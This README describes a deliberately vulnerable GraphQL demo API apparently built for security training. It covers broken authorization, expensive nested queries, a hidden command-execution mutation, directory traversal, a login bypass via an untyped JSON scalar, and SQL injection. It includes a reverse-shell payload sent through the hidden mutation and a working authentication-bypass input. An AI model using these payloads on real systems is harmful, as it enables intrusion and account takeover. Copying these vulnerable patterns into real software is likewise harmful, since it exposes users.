# GraphQL Demo API

A simple GraphQL API demonstrating several common vulnerabilities.

Authored by Aidan Noll, Carve Systems, LLC.

## Requirements

Node, NPM, and Python

## Setup

```
# Install all dependencies.
npm install
# Build the TypeScript source.
npm run tsc
# Create the database and seed it with random users and comments.
npm run sequelize db:migrate
npm run sequelize db:seed:all
```

## Running

To run the main API:

```
./run.sh
```

## Usage

The GraphQL API is available on port 3000. Visiting the homepage will take you to a GraphIQL IDE for exploration.

The API provides a simple social media/blog system. Users are able to make and view posts from other users, and they can be marked private so that they can't be seen by other users.

### Queries

me: returns information (id, firstName, lastName, list of posts) about the currently logged in user. On first access to the API, a user is assigned to your session.

allUsers: provides a list of all users. Has the same information as `me` -- but filters out private posts from other users.

post(id): Returns a specific post by ID. -- `(id, title, content, author)`.

search(query): Returns posts that contain the `query` string within their contents. E.g., search("asdf") would return any post containing "asdf".

getAsset(name): Retrieves an asset from the backend REST API and returns its contents as a string.


### Mutations

register(username, password, firstName, lastName): Registers a new account. Does not log into the new account.

login(username, password): Logs you into the account given by `username` if the password is correct.

createPost(title, content, public): Creates a new post.

superSecretPrivateMutation(command): ???

## Bugs

### Authorization

Authorization is handled by field resolvers. As a result, forgetting to check authorization in one location leads to authorization bugs.

In this API, private posts are directly accessible through the `post(id)` query.

```
query {
    post("1") {
        public
    }
}
```

### Expensive Queries

As API users are able to specify what they want, a massive, complicated-to-execute query can be sent: 

```
query {
  allUsers{
    posts
    {
      content
      author
      {
        posts
        {
          content
          author
          {
            firstName
            lastName
          }
        }
      }
    }
  }
}
```

### "Hidden" Mutations

Introspection reveals all. If introspection is enabled, any hidden/private queries and mutations can be found by sending an introspection query.

GraphIQL automatically does this, so hidden queries show up in it.

This API has a hidden mutation that exposes command execution.

Update with valid ID and port for fun.

```
mutation {
  superSecretPrivateMutation(command: "/bin/bash -i >& /dev/tcp/<IPADDRESS>/65000 0>&1") {
    stdout
    stderr
  }
}
```

### Parameter Tampering to Backend APIs

Many GraphQL APIs proxy some endpoints to external REST APIs. In many cases, they fail to validate the ID or other URL parameters, allowing for the endpoint reached to be modified.

`getAssets(name)` makes a request to a local HTTP server. However, as the field is not validated, directory traversal can be used to read files outside of the intended `assets` folder.

### Unsafe Custom Scalars

GraphQL allows for applications to define custom scalar types, which can be used by schemas as input types in addition to the built-in types. While GraphQL validates that the argument types are correct, custom scalars must be used and validated carefully. 

This application uses the `GraphQLJSON` type from the `graphql-type-json` for parameters to the `login` mutation, instead of having separate `string` parameters. Because the types of the contained objects are not validated, the username and password may be objects instead of strings.

As a result, passing the following as input to the login mutation will result in an authentication bypass.
```
{
    username: "Selmer66",
    password: {gt: ""}
}
```

### SQLi (bonus?)

I have seen SQL injection in GraphQL APIs before, so this type of vulnerability is never going away.

The `search(query)` uses the query to build a SQL `LIKE` clause, and it does so unsafely. 
